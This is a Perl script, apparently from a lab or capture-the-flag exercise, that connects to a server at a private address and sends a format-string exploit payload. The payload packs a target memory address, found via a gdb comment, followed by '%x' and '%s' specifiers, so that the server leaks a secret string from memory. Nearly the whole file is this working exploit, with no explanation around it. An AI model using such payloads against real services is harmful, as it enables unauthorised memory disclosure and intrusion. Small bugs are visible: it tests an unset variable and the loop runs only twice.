#!/usr/bin/perl
#tcpclient.pl

use IO::Socket;

$socket = new IO::Socket::INET (
                                  PeerAddr  => '10.128.10.25',
                                  PeerPort  =>  7778,
                                  Proto => 'tcp',
                               )                
or die "Couldn't connect to Server\n";
# (gdb) print secret
# $1 = 0x8048720 "you got me!!"
$count = 1024;                         
while ($count le 1025) {

    $socket->recv($recv_data,1024);
	    print "RECIEVED: $recv_data"; 
        
        if ($resp =~ /you/) {
                print "contains $recv_data\n";
                last;
        }
        $str_addr = pack("L", 0x8048720);
        $bytes = ("%x " x 7);
        $send_data =  $str_addr . $bytes . ("%s") . "\n";
        
        $tmp=$send_data;
	chop($tmp); # get rid of new line
              
        if ($tmp ne 'quit') {
	        $socket->send($send_data);
        }    else {
	        $socket->send($send_data);
            	close $socket;
            	last;
        }
        # print "Count is: $count\n";
        $count++;
}    
    
